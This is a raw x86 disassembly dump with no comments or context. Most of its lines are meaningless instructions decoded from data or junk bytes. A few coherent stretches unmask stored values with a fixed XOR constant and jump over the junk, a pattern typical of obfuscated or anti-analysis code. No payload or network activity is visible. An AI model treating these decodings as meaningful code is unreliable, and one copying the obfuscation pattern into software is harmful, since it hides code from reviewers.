  40d640:	add    ah,BYTE PTR [edx+0x60ff0935]
  40d646:	mov    edx,0x20c6d940
  40d64b:	inc    ebp
  40d64c:	stos   BYTE PTR es:[edi],al
  40d64d:	sub    eax,DWORD PTR [ecx-0x68]
  40d650:	ret    
  40d651:	pop    esi
  40d652:	imul   DWORD PTR [esi]
  40d654:	jge    0x40d68a
  40d656:	int    0xd0
  40d658:	pop    esp
  40d659:	cmp    DWORD PTR [ebx+0x36],edx
  40d65c:	pop    esp
  40d65d:	ja     0x40d6d4
  40d65f:	pop    ebp
  40d660:	popf   
  40d661:	sbb    eax,0xf1b5012f
  40d666:	call   0xff66:0x5fa94a7
  40d66d:	scas   al,BYTE PTR es:[edi]
  40d66e:	add    esi,0xffffffb1
  40d671:	cli    
  40d672:	inc    ecx
  40d673:	and    cl,BYTE PTR [edi+0x10]
  40d676:	icebp  
  40d677:	dec    edx
  40d678:	dec    ebp
  40d679:	adc    dl,BYTE PTR [edi]
  40d67b:	test   al,0xc1
  40d67d:	int3   
  40d67e:	mov    dh,0x41
  40d680:	sub    eax,0x3d4412c0
  40d685:	jmp    FWORD PTR [ebx-0x3c]
  40d688:	push   eax
  40d689:	in     al,0xa
  40d68b:	sbb    al,0xc6
  40d68d:	sti    
  40d68e:	div    BYTE PTR [esi-0x13bb5b4]
  40d694:	imul   esi,DWORD PTR [eax-0x1ec130cf],0x8b579aa7
  40d69e:	inc    edi
  40d69f:	mov    ch,0x16
  40d6a1:	int    0x39
  40d6a3:	pop    ecx
  40d6a4:	popa   
  40d6a5:	jle    0x40d6e7
  40d6a7:	xchg   esp,eax
  40d6a8:	sbb    ebx,DWORD PTR es:[ebp+0x3b]
  40d6ac:	cld    
  40d6ad:	mov    dl,0xc2
  40d6af:	add    edx,esp
  40d6b1:	sbb    edx,DWORD PTR fs:[esi]
  40d6b4:	jl     0x40d637
  40d6b6:	xlat   BYTE PTR ds:[ebx]
  40d6b7:	push   ds
  40d6b8:	mov    ebp,0x72ca4ab3
  40d6bd:	sbb    cl,BYTE PTR [eax-0x51]
  40d6c0:	add    eax,0xe4775fd6
  40d6c5:	adc    BYTE PTR [esi-0x72798c22],bh
  40d6cb:	cld    
  40d6cc:	stc    
  40d6cd:	sbb    eax,0xe9441fed
  40d6d2:	stos   DWORD PTR es:[edi],eax
  40d6d3:	loopne 0x40d6cc
  40d6d5:	pusha  
  40d6d6:	push   ecx
  40d6d7:	frstor [edx-0x3b]
  40d6da:	hlt    
  40d6db:	fisub  DWORD PTR ds:0xd65f52ca
  40d6e1:	pop    edx
  40d6e2:	stos   DWORD PTR es:[edi],eax
  40d6e3:	sti    
  40d6e4:	call   0xf7726cd0
  40d6e9:	xlat   BYTE PTR ds:[ebx]
  40d6ea:	les    edx,FWORD PTR [ecx-0x74917f91]
  40d6f0:	inc    ebp
  40d6f1:	cld    
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [eax+0x50de7b8],ss
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d7a0
  40d733:	fucomip st,st(7)
  40d735:	aaa    
  40d736:	sbb    DWORD PTR [ebp+0x76],esi
  40d739:	push   esp
  40d73a:	cmp    eax,0x3d3a7437
  40d73f:	cdq    
  40d740:	add    bl,BYTE PTR [ebx+0x7c10e65c]
  40d746:	pop    ds
  40d747:	and    DWORD PTR [ebx+0x7936e177],ebp
  40d74d:	inc    edx
  40d74e:	and    edi,DWORD PTR [ebp+0x77]
  40d751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d752:	xor    dl,dh
  40d754:	mov    dl,0x49
  40d756:	add    BYTE PTR [ebp-0xe343a0c],ah
  40d75c:	push   ss
  40d75d:	mov    ds:0x8160932a,eax
  40d762:	inc    eax
  40d763:	std    
  40d764:	xchg   edx,eax
  40d765:	xchg   edi,eax
  40d766:	jo     0x40d6f3
  40d768:	push   ss
  40d769:	aad    0x6
  40d76b:	add    edi,edx
  40d76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76e:	xor    ch,BYTE PTR [ebx+ecx*1-0x51]
  40d772:	sbb    esi,DWORD PTR es:[edi]
  40d775:	and    ecx,DWORD PTR ds:0xb2edb84c
  40d77b:	(bad)  
  40d77d:	or     dl,cl
  40d77f:	cs add eax,0x2b9bf0bc
  40d785:	data16 shr BYTE PTR [edi],1
  40d788:	inc    esp
  40d789:	mov    eax,0x4d166d0c
  40d78e:	mov    ebp,0xb988644a
  40d793:	inc    esi
  40d794:	shr    BYTE PTR [esi+eax*8-0x44],1
  40d798:	fsub   QWORD PTR [edi-0x383acefb]
  40d79e:	cs stc 
  40d7a0:	xchg   ebx,eax
  40d7a1:	jecxz  0x40d7a0
  40d7a3:	loop   0x40d804
  40d7a5:	adc    eax,0x56e0a783
  40d7aa:	add    edi,esp
  40d7ac:	cmp    eax,0x25fd34a1
  40d7b1:	arpl   WORD PTR [eax+0x28],bp
  40d7b4:	aas    
  40d7b5:	cdq    
  40d7b6:	(bad)  [edx]
  40d7b8:	push   edi
  40d7b9:	cdq    
  40d7ba:	cwde   
  40d7bb:	lock fst QWORD PTR [edx-0x6]
  40d7bf:	jmp    0x40d7cb
  40d7c1:	or     DWORD PTR [edx+eiz*1-0xd],edi
  40d7c5:	iret   
  40d7c6:	pop    ecx
  40d7c7:	inc    edi
  40d7c8:	loope  0x40d7e9
  40d7ca:	xor    BYTE PTR [eax],0xaf
  40d7cd:	xchg   ecx,eax
  40d7ce:	cmc    
  40d7cf:	fstp   st(0)
  40d7d1:	int3   
  40d7d2:	imul   ebx,DWORD PTR [edi],0x2bb2b217
  40d7d8:	lods   eax,DWORD PTR ds:[esi]
  40d7d9:	cld    
  40d7da:	dec    esi
  40d7db:	loop   0x40d75f
  40d7dd:	and    dl,BYTE PTR [eax+0x748577b8]
  40d7e3:	aas    
  40d7e4:	mov    dl,0x25
  40d7e6:	leave  
  40d7e7:	in     al,dx
  40d7e8:	iret   
  40d7e9:	sbb    al,0x74
  40d7eb:	into   
  40d7ec:	fstp   QWORD PTR [ebp-0x6c]
  40d7ef:	sbb    ebx,DWORD PTR [esi+0x30]
  40d7f2:	fsubr  QWORD PTR [eax-0x7e072f]
  40d7f8:	xchg   edi,eax
  40d7f9:	ins    DWORD PTR es:[edi],dx
  40d7fa:	pop    ecx
  40d7fb:	gs inc esp
  40d7fd:	iret   
  40d7fe:	mov    ds:0x4d33a19a,eax
  40d803:	add    al,0x2c
  40d805:	std    
  40d806:	cmc    
  40d807:	push   ds
  40d808:	ins    DWORD PTR es:[edi],dx
  40d809:	or     ch,ah
  40d80b:	repnz das 
  40d80d:	cmp    eax,0xdca7cca5
  40d812:	push   edx
  40d813:	daa    
  40d814:	xchg   ecx,eax
  40d815:	outs   dx,BYTE PTR ds:[esi]
  40d816:	cld    
  40d817:	into   
  40d818:	sbb    al,BYTE PTR [di+0x250b]
  40d81d:	fs (bad) 
  40d81f:	in     eax,dx
  40d820:	sub    BYTE PTR [edx],0x37
  40d823:	fsub   st(3),st
  40d825:	push   ebp
  40d826:	dec    eax
  40d827:	lock adc ecx,DWORD PTR ds:0x1e52cdf7
  40d82e:	ja     0x40d81b
  40d830:	inc    ebx
  40d831:	and    BYTE PTR [eax],0xe0
  40d834:	bound  edx,QWORD PTR [ebx-0x5f61e25e]
  40d83a:	jecxz  0x40d84c
  40d83c:	sub    al,0x55
  40d83e:	mov    edx,0x393322a3
  40d843:	jl     0x40d8bf
  40d845:	adc    al,0x78
  40d847:	mov    ebx,DWORD PTR [edi+eax*2-0x14]
  40d84b:	pop    es
  40d84c:	xor    BYTE PTR [edi+esi*8],cl
  40d84f:	es jmp 0x48aab2ee
  40d855:	add    eax,0xfdcc6105
  40d85a:	loop   0x40d860
  40d85c:	ret    
  40d85d:	ds pop ecx
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	push   esp
  40d879:	shl    ebp,cl
  40d87b:	jb     0x40d8a6
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d823
  40d885:	out    dx,eax
  40d886:	out    dx,al
  40d887:	xlat   BYTE PTR ds:[ebx]
  40d888:	dec    esi
  40d889:	cld    
  40d88a:	push   edx
  40d88b:	out    0xe7,eax
  40d88d:	push   ds
  40d88e:	sub    al,BYTE PTR [esp+esi*4-0x1784a1ef]
  40d895:	xchg   ebp,eax
  40d896:	cmp    dl,BYTE PTR [edi]
  40d898:	test   DWORD PTR [ebp+0xb],ebx
  40d89b:	add    al,0xf7
  40d89d:	inc    eax
  40d89e:	mov    dl,0xc4
  40d8a0:	imul   edx,ecx,0x6e
  40d8a3:	mov    ds:0x78e69c6b,al
  40d8a8:	push   edx
  40d8a9:	fld    QWORD PTR [ebx]
  40d8ab:	sbb    al,dh
  40d8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ae:	daa    
  40d8af:	aaa    
  40d8b0:	mov    ecx,0x84994211
  40d8b5:	sbb    al,0xc8
  40d8b7:	jl     0x40d89b
  40d8b9:	fs call 0x823b3b88
  40d8bf:	ss xchg ebp,eax
  40d8c1:	add    BYTE PTR ds:0xd94e6e14,bh
  40d8c7:	loop   0x40d8c9
  40d8c9:	imul   ecx,DWORD PTR [ebx+ecx*8+0x64b45228],0xa2450a82
  40d8d4:	cli    
  40d8d5:	(bad)  
  40d8d7:	xorps  xmm1,XMMWORD PTR [esi-0x68b44eca]
  40d8de:	mov    cl,0x3
  40d8e0:	push   es
  40d8e1:	dec    ebp
  40d8e2:	mov    ch,0x25
  40d8e4:	push   edi
  40d8e5:	(bad)  
  40d8e6:	fdiv   st(0),st
  40d8e8:	jge    0x40d86e
  40d8ea:	adc    al,BYTE PTR [edx]
  40d8ec:	pushf  
  40d8ed:	add    al,0xe1
  40d8ef:	jmp    0x40d8ca
  40d8f1:	push   ss
  40d8f2:	rcl    ch,cl
  40d8f4:	dec    esp
  40d8f5:	js     0x40d907
  40d8f7:	sahf   
  40d8f8:	push   ss
  40d8f9:	fcmove st,st(2)
  40d8fb:	sbb    al,0x3e
  40d8fd:	sub    esp,DWORD PTR [edi-0x34]
  40d900:	loopne 0x40d981
  40d902:	xor    DWORD PTR [ebx+ebx*1+0x2bff901],ebp
  40d909:	xor    eax,DWORD PTR [ecx+0x1d]
  40d90c:	sbb    ecx,esp
  40d90e:	add    ecx,DWORD PTR [eax]
  40d910:	pop    ebp
  40d911:	lods   eax,DWORD PTR ds:[esi]
  40d912:	mov    WORD PTR [esi*4-0x3d4c5fb3],?
  40d919:	mov    DWORD PTR [eax-0x2d1d98d7],esi
  40d91f:	(bad)  
  40d920:	xchg   edi,eax
  40d921:	push   ebp
  40d922:	push   ecx
  40d923:	(bad)  
  40d924:	sbb    edx,DWORD PTR [ebx+ecx*4-0x61]
  40d928:	jno    0x40d8fe
  40d92a:	and    dh,ah
  40d92c:	jmp    0x40d915
  40d92e:	ret    
  40d92f:	mov    eax,0xbfec165e
  40d934:	pop    ds
  40d935:	sbb    ebx,DWORD PTR [esp+esi*2]
  40d938:	(bad)  
  40d939:	jmp    0xa11da237
  40d93e:	and    ah,dh
  40d940:	cmp    al,0x51
  40d942:	jmp    0x1173:0x78e0e976
  40d949:	cmp    eax,0x3d1c3386
  40d94e:	pop    edi
  40d94f:	jmp    0x982f:0xb6b359e0
  40d956:	push   esi
  40d957:	push   edi
  40d958:	or     al,0xd9
  40d95a:	mov    ds:0xb4d505d7,eax
  40d95f:	cs pop esi
  40d961:	sahf   
  40d962:	les    esi,FWORD PTR [edi-0x133e3bf2]
  40d968:	dec    eax
  40d969:	in     eax,dx
  40d96a:	sub    BYTE PTR [edi+0x31f8edff],cl
  40d970:	add    DWORD PTR [eax-0x2515446a],edi
  40d976:	ss push ds
  40d978:	xchg   edi,eax
  40d979:	or     BYTE PTR [ebx+ebp*2],al
  40d97c:	mov    ?,WORD PTR [edx-0x65]
  40d97f:	sbb    DWORD PTR [ebp+0x4d],esi
  40d982:	dec    ebp
  40d983:	adc    bl,BYTE PTR [edx-0x4b]
  40d986:	cmp    cl,BYTE PTR [edi]
  40d988:	cmp    eax,0xc29d86ee
  40d98d:	inc    esp
  40d98e:	psubsw mm3,QWORD PTR [ecx]
  40d991:	mov    bh,0x84
  40d993:	adc    al,0x59
  40d995:	mov    eax,ds:0x34065b82
  40d99a:	pop    ss
  40d99b:	hlt    
  40d99c:	shl    BYTE PTR [ebp+0x77],0xa7
  40d9a0:	mov    ds:0x7df2e1ab,al
  40d9a5:	sbb    edx,eax
  40d9a7:	cmc    
  40d9a8:	cmp    al,0x34
  40d9aa:	pop    ebx
  40d9ab:	scas   al,BYTE PTR es:[edi]
  40d9ac:	mov    ebx,ebp
  40d9ae:	imul   ecx,edi,0xffffff87
  40d9b1:	retf   
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	gs sti 
  40d9c5:	jle    0x40d9be
  40d9c7:	fisttp QWORD PTR [ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	cmp    edx,edi
  40d9d1:	mov    ecx,0xf5a29c9d
  40d9d6:	jne    0x40da37
  40d9d8:	inc    edi
  40d9d9:	jo     0x40da3b
  40d9db:	icebp  
  40d9dc:	xor    DWORD PTR [esi+0x15],ebx
  40d9df:	arpl   WORD PTR [ebx-0x50de6be9],bx
  40d9e5:	pop    eax
  40d9e6:	mov    al,0x34
  40d9e8:	dec    edi
  40d9e9:	es loop 0x40d9e9
  40d9ec:	ins    BYTE PTR es:[edi],dx
  40d9ed:	ficomp WORD PTR [esi+0x76]
  40d9f0:	mov    eax,0xaad4ff6c
  40d9f5:	fwait
  40d9f6:	out    0x47,eax
  40d9f8:	in     eax,0x57
  40d9fa:	out    0x4a,eax
  40d9fc:	loop   0x40da4f
  40d9fe:	std    
  40d9ff:	into   
  40da00:	inc    edx
  40da01:	jns    0x40da0b
  40da03:	pusha  
  40da04:	add    BYTE PTR [ecx-0x48965093],ch
  40da0a:	ja     0x40da39
  40da0c:	pop    ebp
  40da0d:	mov    eax,0xd34510f0
  40da12:	pop    ecx
  40da13:	loopne 0x40da5a
  40da15:	mov    edi,0xfa29a72e
  40da1a:	pop    ebp
  40da1b:	mov    ds:0x364102c9,eax
  40da20:	add    edi,DWORD PTR [edi+0x6430cad4]
  40da26:	pop    edi
  40da27:	call   0xcb5a4cad
  40da2c:	mov    DWORD PTR [ebx+eax*2],ebx
  40da2f:	fiadd  DWORD PTR [ecx+0x4c]
  40da32:	xchg   BYTE PTR [edx],dh
  40da34:	aad    0xc6
  40da36:	sub    al,0x1a
  40da38:	into   
  40da39:	fmul   DWORD PTR [esi]
  40da3b:	stos   BYTE PTR es:[edi],al
  40da3c:	enter  0x60cc,0x92
  40da40:	ja     0x40da9e
  40da42:	cdq    
  40da43:	adc    ebp,DWORD PTR [ecx+0x56]
  40da46:	mov    dl,0xcb
  40da48:	out    dx,al
  40da49:	push   cs
  40da4a:	test   BYTE PTR [eax+0x46],cl
  40da4d:	lods   al,BYTE PTR ds:[esi]
  40da4e:	fld    TBYTE PTR [ebp+0x73]
  40da51:	add    eax,0xd5f148d3
  40da56:	pop    ds
  40da57:	pop    ss
  40da58:	adc    bl,BYTE PTR [ecx-0x17b5b00d]
  40da5e:	iret   
  40da5f:	ret    0xc120
  40da62:	jns    0x40da76
  40da64:	add    edx,edx
  40da66:	ins    DWORD PTR es:[edi],dx
  40da67:	test   cl,bl
  40da69:	je     0x40da57
  40da6b:	mov    WORD PTR [ecx],fs
  40da6d:	aam    0x8f
  40da6f:	jno    0x40d9fe
  40da71:	xchg   edx,eax
  40da72:	mov    esp,0x97258cd8
  40da77:	rcr    DWORD PTR [edi],0xb6
  40da7a:	(bad)
  40da7d:	push   ebx
  40da7e:	add    eax,DWORD PTR [eax+0x21]
  40da81:	sub    edx,ebx
  40da83:	retf   0xb3bd
  40da86:	(bad)  
  40da87:	add    DWORD PTR [ecx],ebp
  40da89:	sub    DWORD PTR [ecx],ebp
  40da8b:	leave  
  40da8c:	cmc    
  40da8d:	dec    edi
  40da8e:	push   0xffffff8c
  40da90:	add    ebp,edx
  40da92:	mov    dl,0xce
  40da94:	dec    ebp
  40da95:	into   
  40da96:	xor    al,0xf6
  40da98:	xchg   esi,eax
  40da99:	adc    eax,0x9fcb4624
  40da9e:	lahf   
  40da9f:	scas   al,BYTE PTR es:[edi]
  40daa0:	imul   esp,DWORD PTR [edx+0x68],0x1194da6e
  40daa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa8:	cmp    ebx,DWORD PTR [esi+0x37]
  40daab:	fidiv  WORD PTR [ebp-0x47100783]
  40dab1:	sub    dl,BYTE PTR [eax]
  40dab3:	jle    0x40dad5
  40dab5:	sbb    bl,al
  40dab7:	push   esi
  40dab8:	cwde   
  40dab9:	or     DWORD PTR [esi],edi
  40dabb:	repnz sub ch,ch
  40dabe:	rcl    DWORD PTR [ebx-0x7d],cl
  40dac1:	sub    al,0xb3
  40dac3:	push   cs
  40dac4:	pop    edi
  40dac5:	jp     0x40da96
  40dac7:	adc    eax,0xa257b30b
  40dacc:	mov    esp,0xb7356bcf
  40dad1:	ss inc esi
  40dad3:	mov    esi,0xe57b3c70
  40dad8:	aam    0xe5
  40dada:	cli    
  40dadb:	js     0x40db4d
  40dadd:	mov    eax,0xd39a0201
  40dae2:	push   edi
  40dae3:	mov    ds:0xddd6e064,eax
  40dae8:	mov    eax,ds:0xf7d723b1
  40daed:	sar    BYTE PTR [ecx],1
  40daef:	or     DWORD PTR [ecx+0x37366e26],0x510d7438
  40daf9:	xchg   ebx,eax
  40dafa:	(bad)  
  40dafb:	dec    ecx
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0xaeb6fdf0
  40db32:	pop    es
  40db33:	inc    esp
  40db34:	or     DWORD PTR fs:[eax+0x7f227e7e],0x7357e7e
  40db3f:	or     BYTE PTR [esi],ch
  40db41:	dec    edi
  40db42:	scas   eax,DWORD PTR es:[edi]
  40db43:	aas    
  40db44:	aad    0xfb
  40db46:	mov    ah,BYTE PTR [ecx-0x4d81d975]
  40db4c:	out    0xa7,al
  40db4e:	idiv   DWORD PTR [edi]
  40db50:	shl    bl,0xfb
  40db53:	or     al,0x3
  40db55:	pop    eax
  40db56:	mov    ds:0x32af3f29,al
  40db5b:	xor    ch,0xeb
  40db5e:	xchg   ebx,eax
  40db5f:	ja     0x40db1b
  40db61:	jo     0x40db67
  40db63:	outs   dx,DWORD PTR ds:[esi]
  40db64:	mov    dl,0xda
  40db66:	add    dh,BYTE PTR [edx+0x10fc711f]
  40db6c:	push   0xffffffcf
  40db6e:	xlat   BYTE PTR ds:[ebx]
  40db6f:	ins    DWORD PTR es:[edi],dx
  40db70:	adc    al,0xdd
  40db72:	xchg   edx,eax
  40db73:	push   edi
  40db74:	pop    edi
  40db75:	jp     0x40db61
  40db77:	pop    eax
  40db78:	and    DWORD PTR [edi],0x7a
  40db7b:	mov    WORD PTR [edi-0x19b32f63],gs
  40db81:	mov    ecx,0x1ea5f7b2
  40db86:	call   FWORD PTR [edx+ecx*1]
  40db89:	shl    DWORD PTR [edx+0x6925983c],0xe8
  40db90:	ins    BYTE PTR es:[edi],dx
  40db91:	popa   
  40db92:	push   cs
  40db93:	pop    esp
  40db94:	dec    eax
  40db95:	sub    cl,BYTE PTR [esi+edx*1]
  40db98:	pop    ebx
  40db99:	push   edi
  40db9a:	test   al,0xe4
  40db9c:	or     esp,DWORD PTR [ecx-0xc]
  40db9f:	loopne 0x40db3a
  40dba1:	out    0x84,al
  40dba3:	fld    QWORD PTR [ebx+0x6c141f86]
  40dba9:	out    0x3d,eax
  40dbab:	dec    ecx
  40dbac:	pushf  
  40dbad:	(bad)  
  40dbae:	out    dx,eax
  40dbaf:	cmp    BYTE PTR [ebx-0x69a1c153],bh
  40dbb5:	push   edx
  40dbb6:	xor    eax,0x63ad56f
  40dbbb:	out    0x61,al
  40dbbd:	inc    eax
  40dbbe:	jp     0x40dbfd
  40dbc0:	add    DWORD PTR [edx+0x3e],ebp
  40dbc3:	in     eax,dx
  40dbc4:	xor    esi,DWORD PTR [esi]
  40dbc6:	add    dh,BYTE PTR [ebp+0x22e1e49]
  40dbcc:	pop    es
  40dbcd:	pop    esp
  40dbce:	dec    eax
  40dbcf:	addr16 ja 0x40dc3e
  40dbd2:	mov    edx,0x6aa02f44
  40dbd7:	cli    
  40dbd8:	mov    esp,0xd0df6cf0
  40dbdd:	imul   ebx,DWORD PTR [ebx+ebx*2],0x1a
  40dbe1:	lahf   
  40dbe2:	bound  edi,QWORD PTR ds:0xdffefe93
  40dbe8:	(bad)  
  40dbe9:	daa    
  40dbea:	stos   BYTE PTR es:[edi],al
  40dbeb:	sbb    edi,DWORD PTR [edi+0x43]
  40dbee:	jle    0x40dbe6
  40dbf0:	test   DWORD PTR [ebx+0x46f03171],ebx
  40dbf6:	cmp    DWORD PTR [esi-0x2d],0x6
  40dbfa:	push   esp
  40dbfb:	je     0x40db9f
  40dbfd:	or     al,0xdf
  40dbff:	imul   ebx,DWORD PTR [edi+0x21eef6de],0xffffffb4
  40dc06:	sar    BYTE PTR [ebx-0x7d3db2a8],0x5
  40dc0d:	rol    DWORD PTR [ebx-0x7813e45b],1
  40dc13:	cmp    DWORD PTR [ecx-0x9fa8080],ebx
  40dc19:	movs   WORD PTR es:[edi],WORD PTR es:[esi]
  40dc1c:	mov    al,0xa
  40dc1e:	xchg   ecx,eax
  40dc1f:	jmp    0xdc37:0x5a127a47
  40dc26:	cmc    
  40dc27:	dec    esp
  40dc28:	shl    DWORD PTR [ebx+ebx*8],0x82
  40dc2c:	jl     0x40dbfe
  40dc2e:	loop   0x40dbdd
  40dc30:	leave  
  40dc31:	fucomi st,st(6)
  40dc33:	mov    WORD PTR [edx-0x49d0fe84],fs
  40dc39:	retf   0x6d59
  40dc3c:	adc    esi,DWORD PTR [edi+0xb]
  40dc3f:	dec    ebx
  40dc40:	imul   ebp,ebp,0x39808ed6
  40dc46:	das    
  40dc47:	xor    edi,edi
  40dc49:	(bad)  
  40dc4a:	xchg   ebx,eax
  40dc4b:	xchg   ebp,eax
  40dc4c:	mov    cl,0xb3
  40dc4e:	out    0x89,al
  40dc50:	sub    DWORD PTR [eax],ecx
  40dc52:	scas   eax,DWORD PTR es:[edi]
  40dc53:	in     al,0xdc
  40dc55:	add    cl,BYTE PTR [ebx]
  40dc57:	sub    DWORD PTR [ebx+0x60],esp
  40dc5a:	mov    dl,0xf3
  40dc5c:	call   FWORD PTR [edi+0x71ab03ec]
  40dc62:	aam    0x3f
  40dc64:	or     bh,BYTE PTR ds:[edx+ecx*4]
  40dc68:	ds add eax,edx
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	jbe    0x40dc6f
  40dcde:	or     BYTE PTR [ecx+0x7e7e89b5],cl
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dd23
  40dce9:	loope  0x40dcc8
  40dceb:	push   esp
  40dcec:	mov    al,ds:0x8c935f72
  40dcf1:	ret    0xe35
  40dcf4:	popf   
  40dcf5:	xchg   BYTE PTR [ebx-0x27],dh
  40dcf8:	xor    BYTE PTR [edx-0x7e],0x5b
  40dcfc:	mov    edx,0xd67d74d9
  40dd01:	ds dec ebp
  40dd03:	aaa    
  40dd04:	clc    
  40dd05:	syscall 
  40dd07:	jge    0x40dca7
  40dd09:	mov    al,ds:0x804a2347
  40dd0e:	sbb    al,BYTE PTR [edx]
  40dd10:	jns    0x40dd76
  40dd12:	and    eax,0x8dc21103
  40dd17:	mov    al,0x75
  40dd19:	scas   eax,DWORD PTR es:[edi]
  40dd1a:	mov    al,0x13
  40dd1c:	in     eax,dx
  40dd1d:	xor    eax,0xe83cdfa1
  40dd22:	xor    eax,0xebdc9e1c
  40dd27:	jl     0x40dd92
  40dd29:	and    edx,DWORD PTR [eax]
  40dd2b:	ret    
  40dd2c:	mov    al,0xd0
  40dd2e:	aad    0xe2
  40dd30:	frstor [esi-0x5450e96a]
  40dd36:	mov    dh,0xe5
  40dd38:	repnz or eax,0xf75670d7
  40dd3e:	not    DWORD PTR [ebx+0x2e02724]
  40dd44:	jecxz  0x40dd64
  40dd46:	ror    BYTE PTR [eax-0x16e2f8cd],1
  40dd4c:	test   al,0x72
  40dd4e:	aam    0xd
  40dd50:	cmp    BYTE PTR [eax],cl
  40dd52:	cmp    dl,dl
  40dd54:	rcr    DWORD PTR [ebx-0x25],0xc6
  40dd58:	test   eax,0xa4ac1e60
  40dd5d:	out    dx,al
  40dd5e:	mov    bh,0x71
  40dd60:	out    0xb9,al
  40dd62:	sub    al,0xd8
  40dd64:	xchg   BYTE PTR [esi+ecx*2+0x6a],al
  40dd68:	xor    cl,dh
  40dd6a:	pop    esi
  40dd6b:	pop    es
  40dd6c:	mov    ah,0x68
  40dd6e:	fmul   st(1),st
  40dd70:	mov    edx,0xcbd730a5
  40dd75:	cmp    eax,0x773d8629
  40dd7a:	cmp    DWORD PTR [ecx+0x57],eax
  40dd7d:	sti    
  40dd7e:	mov    ds:0xd3966487,al
  40dd83:	(bad)
  40dd86:	jmp    0xec9ccc4f
  40dd8b:	ret    0x4335
  40dd8e:	adc    DWORD PTR [edi+0x1668c20e],eax
  40dd94:	dec    esp
  40dd95:	pop    ecx
  40dd96:	adc    eax,0x50cde310
  40dd9b:	mov    dh,BYTE PTR [esi]
  40dd9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd9e:	cdq    
  40dd9f:	pop    ss
  40dda0:	jno    0x40dd53
  40dda2:	mov    DWORD PTR [ebx-0x74],0x9a488844
  40dda9:	jae    0x40de2a
  40ddab:	push   es
  40ddac:	adc    BYTE PTR [esi-0x6b],ch
  40ddaf:	div    DWORD PTR [ecx+esi*4-0x18fe50bd]
  40ddb6:	jmp    0xb290b0b9
  40ddbb:	cmp    al,0x6b
  40ddbd:	mov    bh,BYTE PTR [esi+eiz*8]
  40ddc0:	aad    0xc7
  40ddc2:	sub    ebx,DWORD PTR [ecx+0x4f]
  40ddc5:	nop
  40ddc6:	or     DWORD PTR [edx],edi
  40ddc8:	bound  esp,QWORD PTR ds:0x60c43921
